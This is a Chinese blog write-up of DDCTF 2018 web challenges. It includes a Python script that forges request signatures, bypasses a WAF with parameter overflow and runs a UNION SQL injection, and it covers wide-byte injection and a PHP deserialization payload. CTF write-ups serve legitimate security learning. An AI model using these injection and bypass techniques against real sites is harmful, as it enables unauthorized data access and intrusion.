---
title: 2018DDCTF writeup
url: 324.html
id: 324
categories:
  - CTF
date: 2018-04-23 08:55:54
tags:
---

# 前言

DDCTF实在被虐的有点惨，中途就放弃了（逃……） 
只能赛后复现一下，不间断更新。。  

# 数据库的秘密

进入第一步是一个ip验证 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/c0a87245327ee93d7c8c1c21197afb14.png) 
用firefox的插件，添加一个x-forwarded-for 的header就行 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/5b30d8240a7b8cd83c41e4de5b88bc96.png) 
进入之后是个简单的查询功能 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/43948467fe3bc1e665827a31c9bf563a.png) 
任意查询之后发送给一个包，发现多了一个author参数 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/c0d4e8a8260a893bc5af2a195f1b52f3.png) 
回到html页面，发现的确有这个隐藏的form值 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/a8dae9a6a2ec2271dd54afa74fb42991.png) 
经过一些尝试之后发现如下几点 
1、其他的非隐藏值都有被过滤，无法进行注入。但是对author进行`admin'#` 和`admin' and 1#`测试是发现存在注入 
2、有安全狗拦截 
3、不能进行任意发包，会对sig和time参数进行校验 接下来就是把关注点转移到被隐藏的author字段中，并绕过安全狗和前端校验 

前端校验的代码主要在两个js文件中 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/c61c5742e3b6ae49ed7b71ee2832b38a.png) 
math.js中主要是一些给main.js用的函数库，主要来看下main.js 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/4393d7fd936e2fda851a771d184d9904.png) 
进行了js混淆，在网上找个在线的就可以还原，还原代码如下
```php
    function signGenerate(obj, key) {
    	var str0 = '';
    	for (i in obj) {
    		if (i != 'sign') {
    			str1 = '';
    			str1 = i + '=' + obj[i];
    			str0 += str1
    		}
    	}
    	return hex_math_enc(str0 + key)
    };
    var obj = {
    	id: '',
    	title: '',
    	author: '',
    	date: '',
    	time: parseInt(new Date().getTime() / 1000)
    };
    
    function submitt() {
    	obj['id'] = document.getElementById('id').value;
    	obj['title'] = document.getElementById('title').value;
    	obj['author'] = document.getElementById('author').value;
    	obj['date'] = document.getElementById('date').value;
    	var sign = signGenerate(obj, key);
    	document.getElementById('queryForm').action = "index.php?sig=" + sign + "&time=" + obj.time;
    	document.getElementById('queryForm').submit()
    }
```
看到是对传递的参数进行加密，生成sign和time后再进行发送 这里要调用一个python的execjs库，来调用JavaScript代码，生成sign和time值（不得不说一句，python是有点强） 对main.js函数改造一下，返回获取sign和time值的函数
```javascript
    function get_sig(id,title,author,date) {
     obj['id'] = id;
     obj['title'] = title;
     obj['author'] = author;
     obj['date'] = date;
     var sign = signGenerate(obj, key);
     return sign;
    }
    function get_time(){
     return obj.time;
    }
```
还有一点就是，绕过安全狗 
参照大佬的一招——参数溢出 https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri参数溢出漏洞.md 
大致意思就是说传递的参数过多时，会放弃对后面参数的检测 最后，python发包的代码如下的
```python
    #encoding=utf8
    import execjs, requests
    
    _id = ""
    title =""
    author = "admin' union select (select column_name from information_schema.columns where table_name='ctf_key7' limit 0,1),(select secvalue from ctf_key7 limit 0,1),(database()),(select table_name from information_schema.tables where table_schema='ddctf' limit 0,1),5 #"
    date = ""
    
    with open("test.js","r") as f:
    	js = f.read()
    
    func = execjs.compile(js)
    
    headers = {"X-Forwarded-For":"123.232.23.245"}
    
    data = {
    	'UBD':'rS',
    	'sgh':'N5',
    	'ytV':'52',
    	'htx':'s6',
             ……（省略一百个）
    	'3Em':'Og',
    	'xZO':'cJ',
    	'ceX':'OF',
    	'eTu':'an',
    	'5pc':'b6',
    	
    	'id' : _id,
    	'title' : title,
    	'author' : author,
    	'date' : date
    }
    sig = func.call('get_sig',_id,title,author,date)
    time = func.call('get_time')
    url = "http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php?sig={}&time={}".format(sig,time)
    r = requests.post(url,data=data,headers=headers)
    with open("dd.html","w+",encoding='utf8') as f:
    	f.write(r.text)
    print("ok")
```
调用js文件，生成对应的sign和time，然后发送对应的数据包，将返回的页面保存到本地html中，便于观察，此处直接用union注入就行 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/96880c7df2d643a2e21fb423cc76703c.png)    

# 专属链接

java才刚开始学语法，里面一些加密算法实在有些看不懂，先占个位……  

# 注入的奥妙

进去是一个简单的查询功能，题目都说了注入了，先试下注入 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/e3861fd6a104024602b3722a4ef3f57b.png) 
发现被转义，提示页面编码设置 查看源码发现一个奇怪的注释链接，进去之后是一个编码表的链接 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/71b1e517cf4e55713ed70e60f0c98849.png) 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/914ab831359c25aa053496c7f7508604.png) 
emm，应该是宽字节注入 挑一个5c结尾的字符（%5c转义后为 \\），就可以成功闭合转义单引号前面的反斜杠 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/811927a704ac2945f5c9a27e355cbf78.png) 
接下来就可以进行注入了，union被过滤双写即可 
重点在一个route_rules的表中 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/5646e40b98333efc3566b9818128a8b5.png) 
先下载`static/bootstrap/css/backup.css`这个文件，改成.zip后缀解压即可得到备份文件 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/37750051bee93efaf40547758fb7c21d.png) 
然后就是一波辛酸的代码审计（路由配置有点迷。。） 
Test.php中有个很明显的反序列化漏洞 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/1a26f75d027371fb9776e53454ca54e4.png) 
触发反序列化的类在Justtry.php中 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/0deaf1177229345c2b71640e6a8e44d9.png) 
主要还是路由配置。这里就不多分析了 
主要是dispath调用checkurl传递参数给param数组，然后调用invoke函数进行对应类下对应函数的调用 
这里主要就是justtry.try函数，在数据库的路由配置中也明显能看出 
接下来就是构造反序列化的对象 
test类中的uuid即为自己的uuid，fl是一个Flag对象，Flag对象中需要一个SQL对象才能调用对应的sql语句输出flag，构造代码如下
```php
    <?php
    	Class Test{
    	}
    	Class Flag{
    	}
    	Class SQL{
            }
    
    $t = new Test() ;
    $t->user_uuid = "5d71b644-ee63-4b11-9c13-da3c4ac35b8d";  //自己的uuid
    $t->fl = new Flag();
    $t->fl->sql = new SQL();
    
    echo serialize($t);

O:4:"Test":2:{s:9:"user_uuid";s:36:"5d71b644-ee63-4b11-9c13-da3c4ac35b8d";s:2:"fl";O:4:"Flag":1:{s:3:"sql";O:3:"SQL":0:{}}}
```
但是反序列化函数中做了一点点小小的限定 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/a573d641f508ade2a931fee7bb71a6d0.png) 
做一点小小的改动
```
O:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"5d71b644-ee63-4b11-9c13-da3c4ac35b8d";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":0:{}}}
```
在justtry/try页面中post改数据即可 
![](http://blog.kingkk.com/wp-content/uploads/2018/04/0473786c474654fc71e5dbced65b712f.png)